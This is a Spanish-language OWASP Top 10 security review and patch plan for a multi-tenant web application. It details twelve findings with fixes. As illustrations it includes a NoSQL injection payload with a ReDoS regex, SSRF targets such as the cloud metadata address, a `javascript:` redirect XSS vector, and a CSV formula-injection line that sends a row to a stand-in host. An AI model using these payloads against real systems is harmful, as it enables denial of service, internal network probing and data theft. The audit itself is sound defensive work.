# Plan de seguridad — revisión OWASP Top 10 (2021)

Revisión de la base de código a fecha **19/08/2026** contra las diez categorías
del OWASP Top 10, con las irregularidades **verificadas** (no supuestas) y un
plan de parches acotado.

**Criterio del plan:** cada parche toca el menor número de archivos posible y,
siempre que se puede, cae en un **módulo puro** que ya tiene test unitario. Nada
de reescribir capas que funcionan. Las cuatro cosas de la Fase 1 son las únicas
que cambian comportamiento observable, y las tres primeras solo para entradas
que hoy ya son inválidas.

---

## Cómo se ha revisado

- Lectura de toda la superficie de entrada: `proxy.js`, los 15 route handlers de
  `app/**/api`, los 12 archivos de server actions, y la capa de servicios de
  `lib/`.
- Verificación en ejecución de lo que se podía verificar sin levantar la app:
  `buildQuery` con valores hostiles a través de `scripts/alias-loader.mjs`
  (resultado abajo, en S-01 y S-08).
- Seguimiento de cada sink hasta su origen: `grep` de `dangerouslySetInnerHTML`,
  `innerHTML`, `new RegExp`, `fetch(`, `location.href`, `href=`.
- `npm audit --omit=dev` → **0 vulnerabilidades**.

---

## Lo que está bien (y no hay que tocar)

Conviene dejarlo escrito para que ningún parche futuro lo desmonte por error:

| Área                           | Estado                                                                                                                                                                                                                                                                                     |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **A01 Control de acceso**      | Multi-tenancy consistente: `assertTenant(ctx)` + filtro por `workspaceId` en **todos** los servicios revisados; `can(ctx, action)` deniega por defecto ante una acción desconocida. El `workspaceId` sale siempre de la sesión. `switchWorkspaceAction` revalida la pertenencia contra BD. |
| **A02 Criptografía**           | bcrypt coste 12; AES-256-GCM con IV aleatorio y tag para los secretos de integraciones; tokens de invitación, reset y API key guardados **solo como hash sha256**; cookies `__Host-` + `httpOnly` + `SameSite=Lax` en producción.                                                          |
| **A06 Componentes**            | `npm audit` limpio, `npm ci` con lockfile, imagen Docker multi-etapa con usuario sin privilegios.                                                                                                                                                                                          |
| **A08 Integridad**             | Firma de Stripe verificada sobre el cuerpo crudo con el SDK oficial e idempotencia por `event.id`; HMAC en los webhooks salientes; ningún script de terceros en el bundle (no hace falta SRI).                                                                                             |
| **XSS**                        | Cero `dangerouslySetInnerHTML` / `innerHTML` en todo el repo. Los campos `LINKS` se pintan como texto, no como anclas. CSP con nonce por respuesta y `strict-dynamic`. La **única** excepción es S-03.                                                                                     |
| **Recuperación de contraseña** | Token de un solo uso, TTL 1 h, solo el hash en BD, responde igual exista o no la cuenta, invalida los pendientes. Bien resuelto.                                                                                                                                                           |
| **OAuth**                      | `state` anti-CSRF en cookie `__Host-`, `id_token` verificado contra el JWKS con `audience` e `issuer`.                                                                                                                                                                                     |
| **Servido de adjuntos**        | Lista blanca de MIME antes de escribir, `Content-Disposition: attachment` para todo lo que no sea inofensivo, `nosniff`, `Cache-Control: private, no-store`.                                                                                                                               |

---

## Hallazgos

| ID       | OWASP                         | Severidad | Dónde                                                             |
| -------- | ----------------------------- | --------- | ----------------------------------------------------------------- |
| **S-01** | A03 Inyección                 | **Alta**  | `lib/records/query-builder.js`, `lib/automations/engine.js`       |
| **S-02** | A10 SSRF                      | **Alta**  | `lib/webhooks/service.js`                                         |
| **S-03** | A03 Inyección (XSS)           | **Alta**  | `lib/forms/service.js` + `components/forms/PublicFormRenderer.js` |
| **S-04** | A07 Fallos de identificación  | **Alta**  | `lib/auth/jwt.js`, `lib/auth/dal.js`, `models/User.js`            |
| **S-05** | A04 Diseño inseguro           | Media     | `lib/records/service.js`, `app/(workspace)/objects/actions.js`    |
| **S-06** | A04 Diseño inseguro           | Media     | `app/(workspace)/api/upload/route.js`                             |
| **S-07** | A03 Inyección (CSV)           | Media     | `components/record-table/RecordTable.js`                          |
| **S-08** | A03 Inyección                 | Baja      | `lib/records/query-builder.js`                                    |
| **S-09** | A05 Configuración             | Baja      | `lib/storage/local.js`                                            |
| **S-10** | A07 Fallos de identificación  | Baja      | `lib/accounts/authenticate.js`                                    |
| **S-11** | A09 Registro y monitorización | Baja      | `lib/utils/logger.js` y llamantes                                 |
| **S-12** | A05 Configuración             | Baja      | `lib/errors/to-response.js`                                       |

---

### S-01 · Inyección de operadores NoSQL en los filtros — **Alta**

**Dónde.** `lib/records/query-builder.js:56` pasa `filter.value` tal cual a
`def.buildFilter(...)`, y casi todos los tipos lo incrustan directo en el match:
`{ 'data.nombre': value }` (`scalar.js:16`, `choice.js:27`, `special.js:12,52,89`…).
El valor llega sin validar desde `listRecordsAction` (`app/(workspace)/objects/actions.js:70`),
disponible para **cualquier usuario autenticado**.

**Verificado.** Ejecutando `buildQuery` con `value: { $regex: '(a+)+$', $options: 'i' }`:

```json
{
  "$and": [
    { "workspaceId": "W1", "objectMetadataId": "O1" },
    { "deletedAt": null },
    { "data.nombre": { "$regex": "(a+)+$", "$options": "i" } }
  ]
}
```

El objeto llega a Mongo como operador. Con `{ $ne: null }` sale
`{"data.nombre":{"$ne":null}}`, y con `isAnyOf` sale `{"$in":{…}}`.

**Impacto real.** **No es una fuga entre tenants**: `workspaceId` y
`objectMetadataId` siguen fijados en el `$and` y no se pueden desplazar desde el
valor. Lo que sí permite:

1. **Consumo de CPU en la BD** con una regex de backtracking catastrófico
   evaluada documento a documento sobre una colección sin índice de apoyo. Es el
   riesgo serio: un usuario con la cuenta gratis puede tumbar el Mongo de todos.
2. Manipular el filtro más allá de los operadores que la metadata declara.
3. `$in` con un valor que no es array → error de Mongo → 500 y ruido en el log.

**Parche.** Un único punto de coacción, sin tocar los 24 tipos. En
`lib/field-types/helpers.js`:

```js
const ARRAY_OPS = new Set(['isAnyOf', 'isNoneOf', 'containsAny', 'containsAll']);

/**
 * Los valores de filtro vienen del cliente. Si dejamos pasar un objeto, Mongo lo
 * lee como un operador (`{$regex}`, `{$ne}`…) y el filtro deja de ser un filtro:
 * el cliente pasa a escribir la consulta. Aquí se recorta a lo único que un
 * valor de filtro puede ser — escalar, o lista de escalares en los operadores
 * de conjunto.
 */
export function coerceFilterValue(value, operator) {
  const scalar = (v) => {
    if (v === null || v === undefined) return null;
    if (typeof v === 'object') throw new ValidationError('Valor de filtro no válido');
    return v; // string | number | boolean
  };
  if (ARRAY_OPS.has(operator)) return (Array.isArray(value) ? value : [value]).map(scalar);
  return scalar(value);
}
```

Y en los **dos** llamantes (`query-builder.js:56` y `automations/engine.js:29`),
coaccionar antes de llamar a `buildFilter`.

**Riesgo de regresión: nulo.** `FilterEditor.js:47` solo envía cadenas o `null`,
igual que `parse-list-params.js`. Ningún filtro legítimo manda un objeto. De
propina, `isAnyOf` con una cadena suelta pasa de reventar a funcionar.

**Test.** Ampliar `tests/unit/query-builder.test.js`: un objeto en el valor
lanza `ValidationError`; una cadena sigue produciendo el mismo match de hoy.

---

### S-02 · SSRF a la red interna vía webhooks — **Alta**

**Dónde.** `lib/webhooks/service.js:39` valida la URL con
`/^https?:\/\//` y nada más. `deliver()` (línea 80) hace `fetch` contra ella.

**Impacto real.** Un ADMIN de cualquier workspace (incluido el plan gratis)
apunta un webhook a `http://169.254.169.254/latest/meta-data/iam/…`, a
`http://127.0.0.1:27017` o a cualquier host de la red del VPS, y luego usa
**«Reintentar»** (`retryDelivery`) para dispararlo bajo demanda. El cuerpo de la
respuesta **no** se devuelve al panel (`toWebhookDTO` omite `responseSnippet`),
pero sí `statusCode` y `error`, que bastan como oráculo para barrer puertos y
servicios internos. Además `fetch` sigue redirecciones por defecto, así que
validar la URL al guardarla no basta por sí solo.

**Parche.** Módulo puro nuevo `lib/http/safe-url.js` con `assertPublicUrl(url)`:

- Esquema `http:`/`https:` (ya está) y **puerto** en `{80, 443, 8080, 8443}`.
- Resolver el host con `dns.lookup(host, { all: true })` y rechazar toda IP
  privada, de loopback, link-local (`169.254/16`, `fd00::/8`, `::1`) o
  `0.0.0.0/8`. Rechazar también `localhost` y `.internal`/`.local`.
- Llamarlo en `createWebhook` **y otra vez dentro de `deliver`**, justo antes
  del `fetch`: la comprobación al guardar no sirve si el DNS cambia después
  (rebinding).
- En el `fetch`, `redirect: 'manual'`: si el destino responde 3xx se anota como
  entrega fallida en vez de seguir la redirección a donde sea.

**Riesgo de regresión: bajo.** Solo afecta a destinos que hoy no deberían
funcionar. Documentar en `docs/runbook.md` que un webhook a un servicio del
propio host deja de estar permitido.

**Test.** `tests/unit/safe-url.test.js` con la tabla de casos (público → pasa;
`127.0.0.1`, `10.x`, `192.168.x`, `169.254.169.254`, `localhost`, puerto raro →
lanza).

---

### S-03 · `javascript:` en el redirect del formulario público → XSS — **Alta**

**Dónde.** `lib/forms/service.js` guarda `redirectUrl` sin validar el esquema
(`createForm`, y `updateForm` con `patch.redirectUrl?.trim() || null`).
`getPublicForm` lo devuelve al navegador y
`components/forms/PublicFormRenderer.js:49` hace:

```js
if (form.redirectUrl) {
  window.location.href = form.redirectUrl;
  return;
}
```

**Impacto real.** `javascript:…` en ese campo ejecuta código **en nuestro
origen**, en una página **pública y sin sesión**, contra cualquier visitante que
envíe el formulario. Lo configura un ADMIN, así que no es escalada dentro de un
workspace ajeno, pero sí convierte nuestro dominio en plataforma de phishing o
de robo de datos del propio formulario, y la CSP no lo frena (`javascript:` en
una navegación no lo cubre `script-src`).

**Parche.** Dos líneas, en los dos lados:

- Servidor (`lib/forms/service.js`): un helper `normalizeRedirectUrl(raw)` que
  acepta solo `http:`/`https:` parseando con `new URL()`, y lanza
  `ValidationError('La URL de redirección debe empezar por http:// o https://')`
  en cualquier otro caso. Usarlo en `createForm` y `updateForm`.
- Cliente (`PublicFormRenderer.js`): comprobar el esquema otra vez antes de
  asignar. Los formularios ya guardados con un valor raro no deben ejecutarlo.

**Migración.** Un `scripts/` de una pasada que ponga a `null` los `redirectUrl`
que no empiecen por `http`. Hoy, en la práctica, no habrá ninguno.

**Riesgo de regresión: nulo** para URLs normales.

---

### S-04 · Cambiar la contraseña no cierra las sesiones abiertas — **Alta**

**Dónde.** El JWT de `lib/auth/jwt.js` vive **7 días** y no lleva versión.
`changePassword` (`lib/accounts/profile.js`) y `resetPassword`
(`lib/accounts/password-reset.js`) reescriben el `passwordHash` y no invalidan
nada más que los enlaces de recuperación pendientes.

**Impacto real.** Es el escenario que la recuperación de contraseña existe para
resolver: a alguien le roban la cuenta, cambia la contraseña… y **la sesión del
atacante sigue viva hasta una semana**. La contramedida que el usuario cree
haber tomado no surte efecto. Afecta igual a `removeMember`, salvo que ahí el
DAL sí revalida la pertenencia en cada petición y la sesión muere sola.

**Parche.** El mínimo que cierra el agujero sin montar sesiones en BD:

1. `models/User.js`: campo `sessionsValidFrom: { type: Date, default: null }`.
2. `lib/auth/jwt.js`: `decryptSession` devuelve también `payload.iat`.
3. `lib/auth/dal.js` → `getContext`: junto a la consulta de `WorkspaceMember`
   (en `Promise.all`, para no añadir latencia en serie) leer
   `User.sessionsValidFrom` y devolver `null` si
   `session.iat * 1000 < sessionsValidFrom`.
4. `changePassword` y `resetPassword`: `user.sessionsValidFrom = new Date()`.
   En `changePassword`, **re-emitir la cookie después** con
   `createSessionCookie`, para no echar de la app al usuario que acaba de
   cambiarla desde Ajustes.

⚠️ Cambia el esquema de un modelo → **reiniciar `npm run dev`** después
(ver la nota de `CLAUDE.md`); en caliente Mongoose conserva el esquema viejo y
descarta el campo nuevo.

**Riesgo de regresión: medio-bajo**, es el parche más delicado de la lista.
Vigilar dos cosas: (a) el `iat` va en **segundos**, así que un cambio y una
petición en el mismo segundo podrían echar al usuario — se evita re-emitiendo la
cookie; (b) los usuarios con `sessionsValidFrom: null` (todos los actuales)
tienen que pasar sin más comprobación.

**Test.** Integración: sesión emitida → cambio de contraseña → `getContext`
devuelve `null` para la cookie vieja y sigue devolviendo contexto para la nueva.

---

### S-05 · Operaciones masivas sin tope — **Media**

**Dónde.** `importRecords` (`lib/records/service.js:637`) recorre `rows` sin
límite y abre **una transacción por fila** (`createRecord`). `bulkDeleteAction`
(`app/(workspace)/objects/actions.js:90`) itera `recordIds` sin límite.

**Impacto real.** Un cliente puede mandar 100 000 filas en una sola server
action y dejar la instancia (una sola, según `docs/plan-produccion.md`) ocupada
indefinidamente. No hace falta malicia: un CSV grande de verdad basta.

**Parche.** Un tope explícito en el servicio, no en la UI:
`MAX_IMPORT_ROWS = 1000` y `MAX_BULK_IDS = 500`, con `ValidationError` clara
(«Importa como mucho 1000 filas por archivo; divide el CSV»). El
`ImportDialog` ya enseña el número de filas: añadir el aviso antes de enviar.

---

### S-06 · `/api/upload` sin freno ni cuota — **Media**

**Dónde.** `app/(workspace)/api/upload/route.js`: valida tipo y tamaño (bien),
pero no pasa por `consumeRateLimit` ni comprueba consumo de disco del workspace.

**Impacto real.** 10 MB por archivo × peticiones ilimitadas = llenar el disco
del VPS. Con el storage en disco local, eso tumba también a Mongo.

**Parche.** Dos líneas y media:

- `consumeRateLimit('upload:' + ctx.workspaceId, { limit: 60, windowMs: 60_000 })`.
- Un límite de almacenamiento por plan en `lib/billing/plans.js` (que ya es el
  sitio donde viven los límites) y `assertWithinPlan(ctx, 'storage')`,
  calculando el uso con un `$sum` sobre `attachments.size` del workspace.

---

### S-07 · Inyección de fórmulas en el CSV exportado — **Media**

**Dónde.** `components/record-table/RecordTable.js:418` (`csvCell`). Entrecomilla
y escapa las comillas — correcto para el formato — pero no neutraliza las celdas
que empiezan por `=`, `+`, `-`, `@`, tab o CR.

**Impacto real.** Los datos entran por sitios que **no controlamos**:
formularios públicos (`submitPublicForm`) y leads de Meta
(`POST /api/v1/intake/meta`). Un lead con nombre `=HYPERLINK("http://x/?"&A1,"ver")`
se ejecuta en Excel o Sheets **en el equipo del comercial** que abre el export,
y exfiltra la fila. Es la vía clásica desde un formulario de captación.

**Parche.** En `csvCell`, prefijar con comilla simple el texto que empiece por
uno de esos caracteres, antes de entrecomillar. Mejor aún: mover `csvCell` a un
módulo puro `lib/records/csv.js` con test propio, porque hoy es lógica de
formato metida en un componente de 400+ líneas.

---

### S-08 · `sortValue` del cursor sin normalizar — **Baja**

**Dónde.** `lib/records/query-builder.js:88-96`. Con orden de columna el valor
pasa por `normalize()`; **sin** orden de columna (el caso por defecto, orden por
`position`) se usa crudo.

**Verificado.** Con un cursor que codifica `{"sortValue":{"$ne":null}}`:

```json
{
  "$or": [
    { "position": { "$gt": { "$ne": null } } },
    { "position": { "$ne": null }, "_id": { "$gt": "…" } }
  ]
}
```

**Impacto real.** El mismo que S-01 pero más estrecho (solo `position`, que es
una cadena corta): no hay fuga entre tenants. Se arregla en la misma sesión.

**Parche.** En `decodeCursor` (`lib/utils/cursor.js`), rechazar el cursor si
`sortValue` no es escalar o `null`, devolviendo `null` como con cualquier cursor
corrupto. Y envolver `new mongoose.Types.ObjectId(decoded.id)` para que un id
inválido devuelva «cursor no válido» en vez de un 500 (ver S-12).

---

### S-09 · Comprobación de ruta por prefijo en el storage — **Baja**

**Dónde.** `lib/storage/local.js:16`: `if (!full.startsWith(BASE))`. Un `BASE`
de `/app/storage` valida como buena una ruta `/app/storage-otro/…`.

**Impacto real.** Hoy **no es explotable**: la `key` la genera el servidor
(`workspaceId/uuid-nombre`) y al leer viene del documento de BD. Es una defensa
en profundidad que está a un carácter de ser correcta.

**Parche.** `if (full !== BASE && !full.startsWith(BASE + sep))`.

---

### S-10 · Enumeración de cuentas por tiempo en el login — **Baja**

**Dónde.** `lib/accounts/authenticate.js`: si el usuario no existe no se ejecuta
`bcrypt.compare`, así que la respuesta vuelve en un par de milisegundos frente a
los ~200 ms de una cuenta real. El mensaje sí es genérico.

**Impacto real.** Limitado por `throttleAuth` (20 intentos por IP cada 15 min),
pero sigue permitiendo confirmar si una dirección concreta tiene cuenta.

**Parche.** Comparar contra un hash señuelo constante cuando no hay usuario, para
igualar el tiempo. Cuatro líneas.

---

### S-11 · Sin registro de eventos de seguridad; PII en el log — **Baja**

**Dónde.** `lib/accounts/authenticate.js` no registra los fallos de login;
`throttleAuth` no registra cuándo salta el freno; tampoco quedan trazas
distinguibles de crear una API key, cambiar un rol o dar de alta un webhook.
En sentido contrario, `password-reset.js:41` escribe el email en claro en el log.

**Impacto real.** No hay forma de detectar un ataque en curso ni de reconstruir
qué pasó después. Y los logs quedan con datos personales que el RGPD obliga a
justificar.

**Parche.** Un helper `logSecurityEvent(event, meta)` en `lib/utils/logger.js`
que emita con un prefijo grepeable (`[sec]`) y **hashee o recorte** el email.
Llamarlo en: login fallido, freno disparado, alta/revocación de API key, alta de
webhook, cambio de rol, borrado de cuenta. Encaja con el criterio del logger
actual: se lee a mano con `grep`, no hay agregador.

---

### S-12 · Un id malformado devuelve 500 en vez de 400/404 — **Baja**

**Dónde.** `Record.findOne({ _id: recordId, … })` con un `recordId` que no es un
ObjectId lanza `CastError` de Mongoose, que no es `DomainError`, así que
`errorResponse`/`toActionError` lo convierten en 500 «Error interno» y lo
escriben en el log de errores.

**Impacto real.** Ninguna fuga (el mensaje ya es genérico), pero es ruido que
enmascara los errores reales y regala una forma barata de llenar el log.

**Parche.** En `lib/errors/to-response.js`, mapear `err.name === 'CastError'` y
`BSONError` a `NotFoundError` antes del genérico. Un `if`.

---

## Plan por fases

Las tres fases son independientes; el orden es por riesgo.

### Fase 1 — Lo que hay que parchear ya · ~½ jornada

| #   | Hallazgo | Archivos                                                                                                            |
| --- | -------- | ------------------------------------------------------------------------------------------------------------------- |
| 1.1 | S-01     | `lib/field-types/helpers.js`, `lib/records/query-builder.js`, `lib/automations/engine.js`                           |
| 1.2 | S-08     | `lib/utils/cursor.js`, `lib/records/query-builder.js`                                                               |
| 1.3 | S-03     | `lib/forms/service.js`, `components/forms/PublicFormRenderer.js`, script de una pasada                              |
| 1.4 | S-04     | `models/User.js`, `lib/auth/jwt.js`, `lib/auth/dal.js`, `lib/accounts/profile.js`, `lib/accounts/password-reset.js` |

1.1 y 1.2 comparten test (`tests/unit/query-builder.test.js`) y se hacen de un
tirón. 1.4 va **al final de la fase** y con el dev server reiniciado, porque es
el único que puede echar a un usuario de su sesión si se hace mal.

### Fase 2 — Exposición hacia fuera y límites · ~½ jornada

| #   | Hallazgo | Archivos                                                                                                  |
| --- | -------- | --------------------------------------------------------------------------------------------------------- |
| 2.1 | S-02     | `lib/http/safe-url.js` (nuevo), `lib/webhooks/service.js`                                                 |
| 2.2 | S-07     | `lib/records/csv.js` (nuevo), `components/record-table/RecordTable.js`                                    |
| 2.3 | S-05     | `lib/records/service.js`, `app/(workspace)/objects/actions.js`, `components/record-table/ImportDialog.js` |
| 2.4 | S-06     | `app/(workspace)/api/upload/route.js`, `lib/billing/plans.js`, `lib/billing/limits.js`                    |

### Fase 3 — Higiene · ~2-3 h

| #   | Hallazgo | Archivos                          |
| --- | -------- | --------------------------------- |
| 3.1 | S-12     | `lib/errors/to-response.js`       |
| 3.2 | S-09     | `lib/storage/local.js`            |
| 3.3 | S-10     | `lib/accounts/authenticate.js`    |
| 3.4 | S-11     | `lib/utils/logger.js` + llamantes |

---

## Lo que se deja como está, a propósito

- **`style-src 'unsafe-inline'`** en la CSP. Quitarlo exige sacar los `style`
  calculados en runtime (anchos de columna, posiciones del kanban) a variables
  CSS. Es trabajo de refactor de UI, no un parche de seguridad, y el riesgo que
  cubre es marginal teniendo `script-src` con nonce.
- **Rate limit en memoria** (`lib/http/rate-limit.js`). Correcto mientras haya
  **una instancia**, que es el supuesto de `docs/plan-produccion.md`. Cuando
  haya una segunda réplica pasa a ser un agujero real (el cupo se multiplica por
  el número de réplicas). Ya está anotado en «Pendientes conocidos».
- **El MIME de subida lo declara el cliente**, sin comprobar los bytes mágicos.
  El daño está cortado aguas abajo: `nosniff` + `Content-Disposition: attachment`
  para todo lo que no sea imagen, PDF o texto plano. Añadir detección por
  contenido es mejora, no corrección.
- **Host SMTP arbitrario** en las integraciones. Es la misma clase que S-02,
  pero apuntar un SMTP a la red interna no devuelve nada al atacante y sí es una
  necesidad legítima (servidores de correo propios). No compensa restringirlo.
- **`/api/health` sin autenticar.** Hace un `ping` a Mongo, que es exactamente lo
  que un monitor externo necesita. Cachear o autenticar lo dejaría inútil.
